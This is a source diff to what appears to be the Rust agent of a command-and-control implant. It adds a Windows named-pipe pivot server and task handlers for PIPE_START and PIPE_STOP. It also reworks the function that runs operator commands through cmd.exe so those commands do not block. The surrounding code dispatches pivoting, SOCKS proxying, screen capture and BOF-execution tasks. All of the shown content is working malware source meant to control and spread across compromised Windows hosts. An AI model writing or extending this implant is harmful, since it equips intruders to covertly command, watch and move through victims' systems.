@@ -39,6 +39,9 @@ mod rsocks;
 mod http_pivot;
 #[path = "tcp_pivot.rs"]
 mod tcp_pivot;
+#[cfg(target_os = "windows")]
+#[path = "pipe_server.rs"]
+mod pipe_server;
 
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::{Mutex, OnceLock};
@@ -111,15 +114,73 @@ fn spawn_screenwatch_thread(agent_id: String, aes_key: Vec<u8>, interval_sec: u6
 
 #[cfg(target_os = "windows")]
 fn shell(cmd: &str) -> String {
-    match Command::new("cmd.exe").args(["/s", "/c", cmd]).output() {
-        Ok(o) => {
-            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
-            let err = String::from_utf8_lossy(&o.stderr);
-            if !err.is_empty() { out.push_str(&err); }
-            out
-        }
-        Err(e) => format!("[error: {}]", e),
+    use std::io::Read;
+    use std::sync::{Arc, Mutex};
+    use std::process::Stdio;
+
+    let mut child = match Command::new("cmd.exe")
+        .args(["/s", "/c", cmd])
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()
+    {
+        Ok(c)  => c,
+        Err(e) => return format!("[error: {}]", e),
+    };
+
+    // Read stdout/stderr in background threads so we never block
+    // waiting for grandchild processes that inherit the pipe handles.
+    let acc: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));
+    let mut readers = Vec::new();
+    if let Some(stdout) = child.stdout.take() {
+        let out = acc.clone();
+        readers.push(std::thread::spawn(move || {
+            let mut buf = [0u8; 4096];
+            let mut r = stdout;
+            loop {
+                match r.read(&mut buf) {
+                    Ok(0) | Err(_) => break,
+                    Ok(n) => out.lock().unwrap().extend_from_slice(&buf[..n]),
+                }
+            }
+        }));
     }
+    if let Some(stderr) = child.stderr.take() {
+        let out = acc.clone();
+        readers.push(std::thread::spawn(move || {
+            let mut buf = [0u8; 4096];
+            let mut r = stderr;
+            loop {
+                match r.read(&mut buf) {
+                    Ok(0) | Err(_) => break,
+                    Ok(n) => out.lock().unwrap().extend_from_slice(&buf[..n]),
+                }
+            }
+        }));
+    }
+
+    // Wait for cmd.exe itself (not grandchildren) with a 60s deadline.
+    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(60);
+    loop {
+        match child.try_wait() {
+            Ok(Some(_)) => break,
+            Ok(None) => {
+                if std::time::Instant::now() >= deadline {
+                    let _ = child.kill();
+                    break;
+                }
+                std::thread::sleep(std::time::Duration::from_millis(50));
+            }
+            Err(e) => return format!("[error: {}]", e),
+        }
+    }
+
+    // Give reader threads a brief moment to flush then return.
+    // They may still be blocking on grandchild handles — that's fine,
+    // they are daemon threads and we don't join them.
+    std::thread::sleep(std::time::Duration::from_millis(150));
+    let bytes = acc.lock().unwrap().clone();
+    String::from_utf8_lossy(&bytes).into_owned()
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -1214,6 +1275,24 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         }
         "TCP_PIVOT_STOP" => {
             t.send_result(task.id, tcp_pivot::stop_tcp_pivot(), "");
+        }
+        "PIPE_START" => {
+            #[cfg(target_os = "windows")]
+            {
+                let result = pipe_server::pipe_server_start(&task.args, &t.agent_id);
+                t.send_result(task.id, &result, "");
+            }
+            #[cfg(not(target_os = "windows"))]
+            t.send_result(task.id, "", "PIPE_START: not supported on this platform");
+        }
+        "PIPE_STOP" => {
+            #[cfg(target_os = "windows")]
+            {
+                let result = pipe_server::pipe_server_stop(&task.args);
+                t.send_result(task.id, &result, "");
+            }
+            #[cfg(not(target_os = "windows"))]
+            t.send_result(task.id, "", "PIPE_STOP: not supported on this platform");
         }
         "BOF" => {
             #[cfg(target_os = "windows")]
